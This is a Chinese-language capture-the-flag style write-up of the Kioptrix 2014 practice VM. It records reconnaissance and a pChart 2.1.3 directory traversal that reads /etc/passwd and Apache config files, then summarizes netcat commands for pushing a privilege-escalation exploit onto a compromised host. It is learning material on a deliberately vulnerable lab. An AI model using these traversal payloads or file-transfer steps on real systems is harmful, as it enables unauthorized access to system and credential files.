<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>kioptrix 2014（level 5--LFI本地文件包含－敏感文件泄露）)</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">kioptrix 2014（level 5--LFI本地文件包含－敏感文件泄露）)</h1>
        <div class="show-content">
          <p>奇特的是，nmap完全没有探测到主机开放的痕迹，换了几个参数，扫来扫去都没有发现。。。</p><p>是不是配置错误，没有联网，可是桥接没错啊。</p><p>netdiscover -r 192.168.1.0/24</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-d0f48c1ec592dca8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-9086ed9cb96007bc.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>然后找到虚拟机作者的博客。他说这个虚拟机是为了初学者而设计，不是为了有十年经验的渗透者。他做的是帮助初学者在这方面起步。虚拟机有点问题，但是他不知道怎么解决，所以需要移除网卡，然后重新添加上去。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-dfc8e28a3fa1506f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>信息搜集：</p><p>192.168.1.159 </p><p>80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-e2e0fc2e9fb0c026.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p><p>|_http-title: 403 Forbidden  没有权限进入该服务器8080端口。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-cd78651c415aa094.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>Device type: general purpose</p><p>操作系统: FreeBSD 9.0-RELEASE - 10.3-RELEASE</p><h1>分析：</h1><p>8080可能是代理，因为paros进行浏览器代理的时候，用的就是8080端口。（你能有靠谱点的理由吗！好吧，百度搜到的：8080端口是被用于WWW代理服务的，可以实现网页浏览，经常在访问某个网站或使用<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank">代理服务器</a>的时候，会加上“:8080”<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7" target="_blank">端口号</a>。另外Apache Tomcat web server安装后，默认的服务端口就是8080.）</p><h1>进一步探测：</h1><p>经过初步探测，应该从80端口的http服务下手。</p><p>用paros扫描，完全没有什么用。注：新手依赖工具，老鸟使用经验就够了。可惜我还是菜鸟。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-926c2a6ccd90a6f4.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>换一个吧，用metasploit自带的web扫描扫描wmap。<a href="https://www.jianshu.com/p/f97c2b28f57a" target="_blank">wmap使用</a>。</p><p>也没有成功扫描出什么。。手工去翻网页</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-93fa9640f16864b6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>也看不出什么名堂。只好看writeup。</p><hr><p>学习到了找到信息，有事没事丢到谷歌上扫的好习惯</p><p>敏感文件泄露、目录遍历漏洞</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-e1dbfd382c795daf.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>到exploit-db上查看，<a href="https://www.exploit-db.com/exploits/31173/" target="_blank">链接</a>说是目录遍历漏洞和反射型xss</p><p>我晕，javascript一年多没碰忘得差不多了，反射型xss怎么整?</p><blockquote><p>http://192.168.1.159/pChart2.1.3/examples/index.php?<b>Action=View&amp;Script=%2f..%2f..%2fetc/passwd</b></p></blockquote><blockquote>
<p><b>获取的用户信息</b></p>
<p>ossec:*:1001:1001:User &amp;:/usr/local/ossec-hids:/sbin/nologin</p>
<p>ossecm:*:1002:1001:User &amp;:/usr/local/ossec-hids:/sbin/nologin</p>
<p>ossecr:*:1003:1001:User &amp;:/usr/local/ossec-hids:/sbin/nologin</p>
</blockquote><p><a href="http://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub" target="_blank">http://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub</a></p><p>writeup已经贴上，就不复制粘贴利用过程了。</p><p>通过目录遍历漏洞获取apache的默认配置文件（信息搜集获取的服务器版本）。</p><p>通过查看默认配置文件，得知从8080端口进入（更改头文件）的方法。（要我我就就看不出也想不到）</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-a7699e13cf0d7ea0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><hr><p><a href="https://www.jianshu.com/p/3910c32a59eb" target="_blank">本地文件包含</a>：简而言之，在目标网站上，url直接是这种类型：http://www.xxx.com/index.php?page=1.html</p><p>就是说，网页通过变量page来获取访问者要求的内容，然而，如果给变量page传递其他文件，甚至是服务器上不打算公开的文件。该脚本还是会乖乖取过来递给攻击者。这TM就很尴尬了，权限没设置好啊。</p><p><b>好，我们现在分析一下，网页做了什么。</b></p><p>导航按钮有，案例、沙盒、延迟载入、图片地图</p><p>点案例，会有图片和图片的源代码。叫图片不合适，应该叫图表。</p><p>图片会延迟出现一点，说明可能是在本地浏览器，通过php脚本，现绘制而成（猜测）。</p><p>F12看网络交互，可以看到服务器传递来的资源，有一些png图片、gif图片，还有php脚本。</p><p>通过打开一些图片的地址 http://192.168.1.159/pChart2.1.3/examples/resources/dash-explorer-noleaf.png</p><p>确认图表是绘制而成的。</p><p>传递过来的php脚本的地址是这样的：</p><p>http://192.168.1.159/pChart2.1.3/examples/index.php?Action=View&amp;Script=example.drawAreaChart.enhanced.php</p><p>点沙盒，貌似可以通过页面上的表单改变参数，点生成图表，图表就可以根据给的参数而变化。</p><p>点延迟载入，翻译了下，貌似是拉丁语，不知道是什么东西。</p><p>点图片地图，貌似也有传递的php脚本。</p><p>http://192.168.1.159/pChart2.1.3/examples/imageMap/index.php?Action=ViewPHP&amp;Script=scripts/3DRing.php</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-0c60b99c9f13a690.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>先用浏览器打开脚本的地址，然后用script参数试试/etc/passwd。发现两个地址都可以成功显示密码文件。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-e96260262d361053.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-87c02b15da3b48cf.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>还有一个问题。。不知道<a href="http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf" target="_blank">Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</a>，这个是怎么猜出来的？</p><p>如果服务器在给出的路径中，并没有那个文件，那么浏览器就会显示空白。每个目标的配置文件，位置应该会有所不同吧。。？</p><p><b>搜索“freebsd apache路径”关键字</b>，注意！下面的默认路径是apache而不是apache22。。。。而在目标中有版本号22。。。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-dc77a842de91c3cf.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>搜索关键字“freebsd apache log file location”，尝试之下找出了两个文件路径。</p><p>http://192.168.1.159/pChart2.1.3/examples/index.php?Action=ViewPHP&amp;Script=../../../../../../../var/log/httpd-error.log</p><p>http://192.168.1.159/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../../../var/log/httpd-access.log</p><h1>尝试本地包含漏洞的代码执行，<a href="http://blog.csdn.net/u013938528/article/details/41517793" target="_blank">参考</a>
</h1><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-b072811a3eb7a10c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>失败，如上图所示，php代码并没有执行。还是&lt;?php phpinfo();  ?&gt;。如果成功执行了，日志页面log应该如下所示。</p><p>失败的原因是：在php.ini中，allow_url_fopen默认一直是On，<b>而allow_url_include从php5.2之后就默认为Off</b>。可能那个参数没开，所以没有执行。（目标主机php版本5.3.8）</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-e721960aa27f0cd4.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption">另一台虚拟靶机的截图</div>
</div><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-d954b60501887962.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><h1>总结：</h1><blockquote><p>curl  -H  "User-Agent:Mozilla/4.0"  http://192.168.1.159:8080</p></blockquote><p>curl与wget的区别：wget用来下载文件。curl可以post数据，可以自定义request等，比较灵活。使用侧重点不同。</p><p>通过在msf里，用“search phptax”，寻找可利用模块。</p><blockquote><p>nc -lvp 443 &lt; exploit.c  （kali执行，将exploit-db的提权命令复制下来，然后监听本地443端口）</p></blockquote><blockquote><p>nc -nv kali主机ip 443 -w 5 &gt;exploit.c  （目标主机反弹shell上执行，获取443端口的exploit文件）</p></blockquote><p>-l：使用监听模式，监控传入的资料；</p><p>-n：直接使用<a href="http://man.linuxde.net/ip" target="_blank">ip</a>地址，而不通过域名服务器；</p><p>-v：显示指令执行过程；</p><p>-w&lt;超时秒数&gt;：设置等待连线的时间；</p><p>可以知道，虽然文件包含漏洞在不能执行任意代码的时候，有点鸡肋，但是泄露的信息同样可能会导致getshell。所以不要小看任何漏洞。</p>
        </div>
      </div>
    </div>
  </body>
</html>
